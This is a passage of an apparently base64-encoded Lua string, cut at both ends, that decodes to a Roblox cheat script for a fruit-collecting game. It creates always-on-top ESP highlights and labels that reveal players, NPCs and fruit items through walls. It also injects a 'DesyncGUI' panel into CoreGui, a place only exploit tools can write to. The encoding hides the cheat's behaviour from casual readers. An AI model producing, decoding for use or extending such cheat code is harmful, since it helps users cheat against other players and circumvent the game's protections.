gcC5EYXRhLkZyYWdtZW50cy5WYWx1ZSBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRleHRTdHIgfj0gIiIgdGhlbiB0ZXh0U3RyID0gdGV4dFN0ciAuLiAiXG4iIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZXh0U3RyID0gdGV4dFN0ciAuLiAiW/Cfn6MgIiAuLiB2YWwgLi4gIl0iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgQ29uZmlnLlNob3dCb3VudHkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YWwgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkgdmFsID0gcC5sZWFkZXJzdGF0c1siQm91bnR5L0hvbm9yIl0uVmFsdWUgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0ZXh0U3RyIH49ICIiIHRoZW4gdGV4dFN0ciA9IHRleHRTdHIgLi4gIlxuIiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGV4dFN0ciA9IHRleHRTdHIgLi4gIlvwn5uh77iPICIgLi4gdmFsIC4uICJdIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR4dExhYmVsLlRleHQgPSB0ZXh0U3RyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eHRMYWJlbC5UZXh0Q29sb3IzID0gdXNlQ29sb3IKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR4dExhYmVsLlRleHRTaXplID0gQ29uZmlnLkVTUFNpemUKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYmIuRW5hYmxlZCA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIGxvY2FsIGVzcEdyb3VwID0gRVNQRm9sZGVyOkZpbmRGaXJzdENoaWxkKHAuTmFtZSAuLiAiX0VTUCIpCiAgICAgICAgICAgICAgICBpZiBlc3BHcm91cCB0aGVuIGVzcEdyb3VwOkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIC0tIE5QQyBFU1AgTE9PUAogICAgICAgIGlmIENvbmZpZy5FU1BOUEMgdGhlbgogICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBwcm9jZXNzTlBDKG1vZGVsKQogICAgICAgICAgICAgICAgaWYgbW9kZWwgfj0gY2hhcmFjdGVyIGFuZCBtb2RlbDpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIGFuZCBtb2RlbDpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSBhbmQgbW9kZWwuSHVtYW5vaWQuSGVhbHRoID4gMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgUGxheWVyczpHZXRQbGF5ZXJGcm9tQ2hhcmFjdGVyKG1vZGVsKSB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsb2NhbCBlc3BJZCA9ICJfTlBDXyIgLi4gdG9zdHJpbmcobW9kZWwpIC4uICJfIiAuLiBtb2RlbDpHZXREZWJ1Z0lkKCkKICAgICAgICAgICAgICAgICAgICBsb2NhbCBlc3BHcm91cCA9IEVTUEZvbGRlcjpGaW5kRmlyc3RDaGlsZChlc3BJZCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiBub3QgZXNwR3JvdXAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBlc3BHcm91cCA9IEluc3RhbmNlLm5ldygiRm9sZGVyIikKICAgICAgICAgICAgICAgICAgICAgICAgZXNwR3JvdXAuTmFtZSA9IGVzcElkCiAgICAgICAgICAgICAgICAgICAgICAgIGVzcEdyb3VwLlBhcmVudCA9IEVTUEZvbGRlcgogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYm94ID0gSW5zdGFuY2UubmV3KCJCb3hIYW5kbGVBZG9ybm1lbnQiKQogICAgICAgICAgICAgICAgICAgICAgICBib3guTmFtZSA9ICJCb3giCiAgICAgICAgICAgICAgICAgICAgICAgIGJveC5TaXplID0gVmVjdG9yMy5uZXcoNCwgNSwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgYm94LkFkb3JuZWUgPSBtb2RlbC5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgICAgICAgICAgICAgICAgIGJveC5BbHdheXNPblRvcCA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgYm94LlpJbmRleCA9IDUKICAgICAgICAgICAgICAgICAgICAgICAgYm94LlRyYW5zcGFyZW5jeSA9IDAuNgogICAgICAgICAgICAgICAgICAgICAgICBib3guQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAxNTAsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIGJveC5QYXJlbnQgPSBlc3BHcm91cAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgaGlnaGxpZ2h0ID0gSW5zdGFuY2UubmV3KCJIaWdobGlnaHQiKQogICAgICAgICAgICAgICAgICAgICAgICBoaWdobGlnaHQuTmFtZSA9ICJOUENDaGFtcyIKICAgICAgICAgICAgICAgICAgICAgICAgaGlnaGxpZ2h0LlBhcmVudCA9IG1vZGVsCiAgICAgICAgICAgICAgICAgICAgICAgIGhpZ2hsaWdodC5EZXB0aE1vZGUgPSBFbnVtLkhpZ2hsaWdodERlcHRoTW9kZS5BbHdheXNPblRvcAogICAgICAgICAgICAgICAgICAgICAgICBoaWdobGlnaHQuRmlsbENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjU1LCAxNTAsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIGhpZ2hsaWdodC5PdXRsaW5lQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgICAgICAgICBoaWdobGlnaHQuRmlsbFRyYW5zcGFyZW5jeSA9IDAuNQogICAgICAgICAgICAgICAgICAgICAgICBoaWdobGlnaHQuT3V0bGluZVRyYW5zcGFyZW5jeSA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGhyZWYgPSBJbnN0YW5jZS5uZXcoIk9iamVjdFZhbHVlIikKICAgICAgICAgICAgICAgICAgICAgICAgaHJlZi5OYW1lID0gIkhpZ2hsaWdodFJlZiIKICAgICAgICAgICAgICAgICAgICAgICAgaHJlZi5WYWx1ZSA9IGhpZ2hsaWdodAogICAgICAgICAgICAgICAgICAgICAgICBocmVmLlBhcmVudCA9IGVzcEdyb3VwCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyh3b3Jrc3BhY2U6R2V0Q2hpbGRyZW4oKSkgZG8gaWYgdjpJc0EoIk1vZGVsIikgdGhlbiBwcm9jZXNzTlBDKHYpIGVuZCBlbmQKICAgICAgICAgICAgaWYgd29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJFbmVtaWVzIikgdGhlbiBmb3IgXywgdiBpbiBwYWlycyh3b3Jrc3BhY2UuRW5lbWllczpHZXRDaGlsZHJlbigpKSBkbyBpZiB2OklzQSgiTW9kZWwiKSB0aGVuIHByb2Nlc3NOUEModikgZW5kIGVuZCBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBmb3IgXywgY2hpbGQgaW4gcGFpcnMoRVNQRm9sZGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIGNoaWxkLk5hbWU6c3ViKDEsIDUpID09ICJfTlBDXyIgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgYm94ID0gY2hpbGQ6RmluZEZpcnN0Q2hpbGQoIkJveCIpCiAgICAgICAgICAgICAgICBpZiBub3QgQ29uZmlnLkVTUE5QQyBvciBub3QgYm94IG9yIG5vdCBib3guQWRvcm5lZSBvciBub3QgYm94LkFkb3JuZWUuUGFyZW50IG9yIGJveC5BZG9ybmVlLlBhcmVudC5IdW1hbm9pZC5IZWFsdGggPD0gMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgaHJlZiA9IGNoaWxkOkZpbmRGaXJzdENoaWxkKCJIaWdobGlnaHRSZWYiKQogICAgICAgICAgICAgICAgICAgIGlmIGhyZWYgYW5kIGhyZWYuVmFsdWUgdGhlbiBocmVmLlZhbHVlOkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgICAgICBjaGlsZDpEZXN0cm95KCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBsb2NhbCBwbGF5ZXJOYW1lID0gY2hpbGQuTmFtZTpnc3ViKCJfRVNQIiwgIiIpCiAgICAgICAgICAgICAgICBpZiBub3QgUGxheWVyczpGaW5kRmlyc3RDaGlsZChwbGF5ZXJOYW1lKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgY2hpbGQ6RGVzdHJveSgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgLS0gRlJVSVQgRVNQIExPT1AKICAgIGlmIENvbmZpZy5FU1BGcnVpdCB0aGVuCiAgICAgICAgbG9jYWwgZGV0ZWN0ZWRGcnVpdHMgPSB7fQogICAgICAgIAogICAgICAgIC0tIFNjYW4gZW50aXJlIHdvcmtzcGFjZSBmb3IgZnJ1aXRzIChEb3VnaCBGcnVpdCBhbmQgb3RoZXIgZnJ1aXRzKQogICAgICAgIGZvciBfLCB2IGluIHBhaXJzKHdvcmtzcGFjZTpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICBpZiB2OklzQSgiVG9vbCIpIGFuZCAodi5OYW1lID09ICJEb3VnaCBGcnVpdCIgb3Igdi5Ub29sVGlwID09ICJCbG94IEZydWl0IiBvciB2Lk5hbWU6ZmluZCgiRnJ1aXQiKSkgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgaGFuZGxlID0gdjpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlIikKICAgICAgICAgICAgICAgIGlmIGhhbmRsZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgZXNwSWQgPSAiX0ZSVUlUXyIgLi4gdG9zdHJpbmcoaGFuZGxlKQogICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChkZXRlY3RlZEZydWl0cywge2lkID0gZXNwSWQsIGhhbmRsZSA9IGhhbmRsZX0pCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0gQ3JlYXRlIEVTUCBmb3IgYWxsIGRldGVjdGVkIGZydWl0cwogICAgICAgIGZvciBfLCBmcnVpdERhdGEgaW4gcGFpcnMoZGV0ZWN0ZWRGcnVpdHMpIGRvCiAgICAgICAgICAgIGxvY2FsIGVzcEdyb3VwID0gRVNQRm9sZGVyOkZpbmRGaXJzdENoaWxkKGZydWl0RGF0YS5pZCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIG5vdCBlc3BHcm91cCB0aGVuCiAgICAgICAgICAgICAgICBlc3BHcm91cCA9IEluc3RhbmNlLm5ldygiRm9sZGVyIikKICAgICAgICAgICAgICAgIGVzcEdyb3VwLk5hbWUgPSBmcnVpdERhdGEuaWQKICAgICAgICAgICAgICAgIGVzcEdyb3VwLlBhcmVudCA9IEVTUEZvbGRlcgogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAtLSBSRUQgQVVSQSAodXNpbmcgSGlnaGxpZ2h0KQogICAgICAgICAgICAgICAgbG9jYWwgaGlnaGxpZ2h0ID0gSW5zdGFuY2UubmV3KCJIaWdobGlnaHQiKQogICAgICAgICAgICAgICAgaGlnaGxpZ2h0Lk5hbWUgPSAiRnJ1aXRIaWdobGlnaHQiCiAgICAgICAgICAgICAgICBoaWdobGlnaHQuQWRvcm5lZSA9IGZydWl0RGF0YS5oYW5kbGUKICAgICAgICAgICAgICAgIGhpZ2hsaWdodC5EZXB0aE1vZGUgPSBFbnVtLkhpZ2hsaWdodERlcHRoTW9kZS5BbHdheXNPblRvcAogICAgICAgICAgICAgICAgaGlnaGxpZ2h0LkZpbGxDb2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCkKICAgICAgICAgICAgICAgIGhpZ2hsaWdodC5GaWxsVHJhbnNwYXJlbmN5ID0gMC41CiAgICAgICAgICAgICAgICBoaWdobGlnaHQuT3V0bGluZUNvbG9yID0gQ29sb3IzLmZyb21SR0IoMjU1LCA1MCwgNTApCiAgICAgICAgICAgICAgICBoaWdobGlnaHQuT3V0bGluZVRyYW5zcGFyZW5jeSA9IDAKICAgICAgICAgICAgICAgIGhpZ2hsaWdodC5QYXJlbnQgPSBlc3BHcm91cAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAtLSAiRnJ1aXQiIHRleHQgdGFnCiAgICAgICAgICAgICAgICBsb2NhbCBiYiA9IEluc3RhbmNlLm5ldygiQmlsbGJvYXJkR3VpIikKICAgICAgICAgICAgICAgIGJiLk5hbWUgPSAiRnJ1aXRJbmZvIgogICAgICAgICAgICAgICAgYmIuQWRvcm5lZSA9IGZydWl0RGF0YS5oYW5kbGUKICAgICAgICAgICAgICAgIGJiLlNpemUgPSBVRGltMi5uZXcoMCwgMTAwLCAwLCAzMCkKICAgICAgICAgICAgICAgIGJiLlN0dWRzT2Zmc2V0ID0gVmVjdG9yMy5uZXcoMCwgMiwgMCkKICAgICAgICAgICAgICAgIGJiLkFsd2F5c09uVG9wID0gdHJ1ZQogICAgICAgICAgICAgICAgYmIuTWF4RGlzdGFuY2UgPSAzMDAwCiAgICAgICAgICAgICAgICBiYi5QYXJlbnQgPSBlc3BHcm91cAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCB0eHQgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICAgICAgICAgICAgICB0eHQuTmFtZSA9ICJGcnVpdFRleHQiCiAgICAgICAgICAgICAgICB0eHQuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAxLCAwKQogICAgICAgICAgICAgICAgdHh0LkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAgICB0eHQuVGV4dFN0cm9rZVRyYW5zcGFyZW5jeSA9IDAKICAgICAgICAgICAgICAgIHR4dC5UZXh0U3Ryb2tlQ29sb3IzID0gQ29sb3IzLm5ldygwLCAwLCAwKQogICAgICAgICAgICAgICAgdHh0LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDUwLCA1MCkKICAgICAgICAgICAgICAgIHR4dC5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgICAgICAgICAgICAgIHR4dC5UZXh0U2l6ZSA9IDE4CiAgICAgICAgICAgICAgICB0eHQuVGV4dCA9ICJGcnVpdCIKICAgICAgICAgICAgICAgIHR4dC5SaWNoVGV4dCA9IGZhbHNlCiAgICAgICAgICAgICAgICB0eHQuUGFyZW50ID0gYmIKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgaHJlZiA9IEluc3RhbmNlLm5ldygiT2JqZWN0VmFsdWUiKQogICAgICAgICAgICAgICAgaHJlZi5OYW1lID0gIkhpZ2hsaWdodFJlZiIKICAgICAgICAgICAgICAgIGhyZWYuVmFsdWUgPSBoaWdobGlnaHQKICAgICAgICAgICAgICAgIGhyZWYuUGFyZW50ID0gZXNwR3JvdXAKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0gQ2xlYW51cCBvbGQgZnJ1aXQgRVNQCiAgICAgICAgZm9yIF8sIGNoaWxkIGluIHBhaXJzKEVTUEZvbGRlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiBjaGlsZC5OYW1lOnN1YigxLCA4KSA9PSAiX0ZSVUlUXyIgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgaGlnaGxpZ2h0UmVmID0gY2hpbGQ6RmluZEZpcnN0Q2hpbGQoIkhpZ2hsaWdodFJlZiIpCiAgICAgICAgICAgICAgICBsb2NhbCBmb3VuZCA9IGZhbHNlCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGZvciBfLCBmcnVpdERhdGEgaW4gcGFpcnMoZGV0ZWN0ZWRGcnVpdHMpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgZnJ1aXREYXRhLmlkID09IGNoaWxkLk5hbWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBmb3VuZCA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBub3QgZm91bmQgdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIGhpZ2hsaWdodFJlZiBhbmQgaGlnaGxpZ2h0UmVmLlZhbHVlIHRoZW4gaGlnaGxpZ2h0UmVmLlZhbHVlOkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgICAgICBjaGlsZDpEZXN0cm95KCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVsc2UKICAgICAgICAtLSBDbGVhbnVwIGFsbCBmcnVpdCBFU1AgaWYgZGlzYWJsZWQKICAgICAgICBmb3IgXywgY2hpbGQgaW4gcGFpcnMoRVNQRm9sZGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIGNoaWxkLk5hbWU6c3ViKDEsIDgpID09ICJfRlJVSVRfIiB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBoaWdobGlnaHRSZWYgPSBjaGlsZDpGaW5kRmlyc3RDaGlsZCgiSGlnaGxpZ2h0UmVmIikKICAgICAgICAgICAgICAgIGlmIGhpZ2hsaWdodFJlZiBhbmQgaGlnaGxpZ2h0UmVmLlZhbHVlIHRoZW4gaGlnaGxpZ2h0UmVmLlZhbHVlOkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgIGNoaWxkOkRlc3Ryb3koKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICAtLSA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KICAgIC0tICAgICAgICAgICAgICAgICAgICAgICAgICBNQUlOIEdVSSAoUHJvZmVzc2lvbmFsKQogICAgLS0gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CgogICAgbG9jYWwgQ3VycmVudFRoZW1lQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQoKICAgIC0tIENsZWFudXAgZXhpc3RpbmcgR1VJIGFuZCBTb3VuZCB0byBwcmV2ZW50IGR1cGxpY2F0ZXMKICAgIGlmIENvcmVHdWk6RmluZEZpcnN0Q2hpbGQoIkRlc3luY0dVSV9WMTAyIikgdGhlbiBDb3JlR3VpLkRlc3luY0dVSV9WMTAyOkRlc3Ryb3koKSBlbmQKICAgIGlmIHBsYXllci5QbGF5ZXJHdWkgYW5kIHBsYXllci5QbGF5ZXJHdWk6RmluZEZpcnN0Q2hpbGQoIkRlc3luY0dVSV9WMTAyIikgdGhlbiBwbGF5ZXIuUGxheWVyR3VpLkRlc3luY0dVSV9WMTAyOkRlc3Ryb3koKSBlbmQKCiAgICBsb2NhbCBTY3JlZW5HdWkgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIpCiAgICBTY3JlZW5HdWkuTmFtZSA9ICJEZXN5bmNHVUlfVjEwMiIKICAgIHBjYWxsKGZ1bmN0aW9uKCkgU2NyZWVuR3VpLlBhcmVudCA9IENvcmVHdWkgZW5kKQogICAgaWYgbm90IFNjcmVlbkd1aS5QYXJlbnQgdGhlbiBTY3JlZW5HdWkuUGFyZW50ID0gcGxheWVyOldhaXRGb3JDaGlsZCgiUGxheWVyR3VpIikgZW5kCgogICAgbG9jYWwgTWFpbkZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICBNYWluRnJhbWUuTmFtZSA9ICJNYWluRnJhbWUiCiAgICBNYWluRnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygwLCA0MDAsIDAsIDUwMCkgCiAgICBNYWluRnJhbWUuUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAtMjAwLCAwLjUsIC0yNTApCiAgICBNYWluRnJhbWUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDE1LCAxNSwgMjApCiAgICBNYWluRnJhbWUuQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgTWFpbkZyYW1lLkFjdGl2ZSA9IHRydWUKICAgIE1haW5GcmFtZS5EcmFnZ2FibGUgPSBmYWxzZQogICAgTWFpbkZyYW1lLkNsaXBzRGVzY2VuZGFudHMgPSB0cnVlIC0tIEltcG9ydGFudCBwb3VyIGwnYW5pbWF0aW9uCiAgICBNYWluRnJhbWUuUGFyZW50ID0gU2NyZWVuR3VpCgogICAgbG9jYWwgTWFpblN0cm9rZSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiKQogICAgTWFpblN0cm9rZS5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDQwLCA0MCwgNTApCiAgICBNYWluU3Ryb2tlLlRoaWNrbmVzcyA9IDEKICAgIE1haW5TdHJva2UuUGFyZW50ID0gTWFpbkZyYW1lCgogICAgbG9jYWwgVUlDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKICAgIFVJQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDQpCiAgICBVSUNvcm5lci5QYXJlbnQgPSBNYWluRnJhbWUKCiAgICAtLSA9PT0gU1RBVFMgR1VJIChUb3AgTGVmdCkgPT09CiAgICBsb2NhbCBTdGF0c0ZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICBTdGF0c0ZyYW1lLk5hbWUgPSAiU3RhdHNGcmFtZSIKICAgIFN0YXRzRnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygwLCAyMDAsIDAsIDEwMCkKICAgIFN0YXRzRnJhbWUuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMjAsIDAsIDIwKQogICAgU3RhdHNGcmFtZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgU3RhdHNGcmFtZS5QYXJlbnQgPSBTY3JlZW5HdWkKICAgIAogICAgbG9jYWwgU3RhdHNMYXlvdXQgPSBJbnN0YW5jZS5uZXcoIlVJTGlzdExheW91dCIpCiAgICBTdGF0c0xheW91dC5Tb3J0T3JkZXIgPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcgogICAgU3RhdHNMYXlvdXQuUGFkZGluZyA9IFVEaW0ubmV3KDAsIDIpCiAgICBTdGF0c0xheW91dC5QYXJlbnQgPSBTdGF0c0ZyYW1lCiAgICAKICAgIGxvY2FsIGZ1bmN0aW9uIGNyZWF0ZVN0YXRMYWJlbChuYW1lKQogICAgICAgIGxvY2FsIGxhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgICAgIGxhYmVsLk5hbWUgPSBuYW1lCiAgICAgICAgbGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAxNSkKICAgICAgICBsYWJlbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgIGxhYmVsLlRleHRDb2xvcjMgPSBDdXJyZW50VGhlbWVDb2xvcgogICAgICAgIGxhYmVsLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgIGxhYmVsLlRleHRTaXplID0gMTIKICAgICAgICBsYWJlbC5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdAogICAgICAgIGxhYmVsLlRleHRTdHJva2VUcmFuc3BhcmVuY3kgPSAwLjUKICAgICAgICBsYWJlbC5WaXNpYmxlID0gZmFsc2UKICAgICAgICBsYWJlbC5QYXJlbnQgPSBTdGF0c0ZyYW1lCiAgICAgICAgcmV0dXJuIGxhYmVsCiAgICBlbmQKICAgIAogICAgbG9jYWwgRlBTTGFiZWwgPSBjcmVhdGVTdGF0TGFiZWwoIkZQU0xhYmVsIikKICAgIGxvY2FsIFBpbmdMYWJlbCA9IGNyZWF0ZVN0YXRMYWJlbCgiUGluZ0xhYmVsIikKICAgIGxvY2FsIFVwdGltZUxhYmVsID0gY3JlYXRlU3RhdExhYmVsKCJVcHRpbWVMYWJlbCIpCiAgICBsb2NhbCBTZXJ2ZXJMYWJlbCA9IGNyZWF0ZVN0YXRMYWJlbCgiU2VydmVyTGFiZWwiKQogICAgCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSBDb25maWcuSXNSdW5uaW5nIGRvCiAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGlmIFNjcmVlbkd1aSBhbmQgU3RhdHNGcmFtZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgRlBTTGFiZWwuVmlzaWJsZSA9IENvbmZpZy5TaG93RlBTCiAgICAgICAgICAgICAgICAgICAgRlBTTGFiZWwuVGV4dCA9ICJGUFM6ICIgLi4gbWF0aC5mbG9vcih3b3Jrc3BhY2U6R2V0UmVhbFBoeXNpY3NGUFMoKSkKICAgICAgICAgICAgICAgICAgICBGUFNMYWJlbC5UZXh0Q29sb3IzID0gQ3VycmVudFRoZW1lQ29sb3IKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBQaW5nTGFiZWwuVmlzaWJsZSA9IENvbmZpZy5TaG93UGluZwogICAgICAgICAgICAgICAgICAgIFBpbmdMYWJlbC5UZXh0ID0gIlBpbmc6ICIgLi4gbWF0aC5mbG9vcihnYW1lOkdldFNlcnZpY2UoIlN0YXRzIikuTmV0d29yay5TZXJ2ZXJTdGF0c0l0ZW1bIkRhdGEgUGluZyJdOkdldFZhbHVlKCkpIC4uICIgbXMiCiAgICAgICAgICAgICAgICAgICAgUGluZ0xhYmVsLlRleHRDb2xvcjMgPSBDdXJyZW50VGhlbWVDb2xvcgogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIFVwdGltZUxhYmVsLlZpc2libGUgPSBDb25maWcuU2hvd1VwdGltZQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHQgPSB3b3Jrc3BhY2UuRGlzdHJpYnV0ZWRHYW1lVGltZQogICAgICAgICAgICAgICAgICAgIGxvY2FsIGhvdXJzID0gbWF0aC5mbG9vcih0IC8gMzYwMCkKICAgICAgICAgICAgICAgICAgICBsb2NhbCBtaW5zID0gbWF0aC5mbG9vcigodCAlIDM2MDApIC8gNjAp" .. "CiAgICAgICAgICAgICAgICAgICAgbG9jYWwgc2VjcyA9IG1hdGguZmxvb3IodCAlIDYwKQogICAgICAgICAgICAgICAgICAgIFVwdGltZUxhYmVsLlRleHQgPSBzdHJpbmcuZm9ybWF0KCJTZXJ2ZXIgVGltZTogJTAyZDolMDJkOiUwMmQiLCBob3VycywgbWlucywgc2VjcykKICAgICAgICAgICAgICAgICAgICBVcHRpbWVMYWJlbC5UZXh0Q29sb3IzID0gQ3VycmVudFRoZW1lQ29sb3IKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBTZXJ2ZXJMYWJlbC5WaXNpYmxlID0gQ29uZmlnLlNob3dTZXJ2ZXIKICAgICAgICAgICAgICAgICAgICBTZXJ2ZXJMYWJlbC5UZXh0ID0gIlJlZ2lvbjogIiAuLiBjYWNoZWRSZWdpb24KICAgICAgICAgICAgICAgICAgICBTZXJ2ZXJMYWJlbC5UZXh0Q29sb3IzID0gQ3VycmVudFRoZW1lQ29sb3IKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgIGVuZAogICAgZW5kKQoKICAgIC0tID09PSBNSU5JTUlaRSBTWVNURU0gPT09CiAgICBsb2NhbCBpc01pbmltaXplZCA9IGZhbHNlCiAgICBsb2NhbCBNaW5pbWl6ZWRHdWkgPSBuaWwKICAgIGxvY2FsIGRyYWdDb25uZWN0aW9uID0gbmlsCiAgICAKICAgIGxvY2FsIGZ1bmN0aW9uIHJlc3RvcmVHdWkoKQogICAgICAgIGlmIG5vdCBpc01pbmlta